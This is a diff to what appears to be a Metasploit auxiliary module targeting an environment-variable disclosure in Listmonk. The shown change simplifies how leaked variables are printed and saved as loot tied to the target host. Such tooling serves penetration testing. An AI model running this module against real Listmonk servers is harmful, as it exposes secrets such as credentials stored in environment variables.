@@ -215,36 +215,24 @@ class MetasploitModule < Msf::Auxiliary
     paragraphs = wrap_div.search('p').map(&:text).map(&:strip).reject(&:empty?)
 
     if paragraphs.any?
-      results = paragraphs
-
-      clean_results = []
-      results.each do |p|
-        clean_text = p.gsub(%r{</?[^>]*>}, '').strip
-        next if clean_text.empty?
-
-        clean_results << clean_text
+      print_good('Environment variable(s) extracted:')
+      print_line('')
+      paragraphs.each do |result|
+        print_line(result.to_s)
       end
 
-      if clean_results.any?
-        print_good('Environment variable(s) extracted:')
-        print_line('')
-        clean_results.each do |result|
-          print_line(result.to_s)
-        end
+      loot_data = paragraphs.join("\n")
+      store_loot(
+        'listmonk.env',
+        'text/plain',
+        rhost,
+        loot_data,
+        'listmonk_env_disclosure.txt',
+        'Listmonk Environment Variables'
+      )
+      print_line('')
 
-        loot_data = clean_results.join("\n")
-        store_loot(
-          'listmonk.env',
-          'text/plain',
-          rhost,
-          loot_data,
-          'listmonk_env_disclosure.txt',
-          'Listmonk Environment Variables'
-        )
-        print_line('')
-      end
-
-      return clean_results
+      return paragraphs
     else
       print_error('No results found in response')
       return []
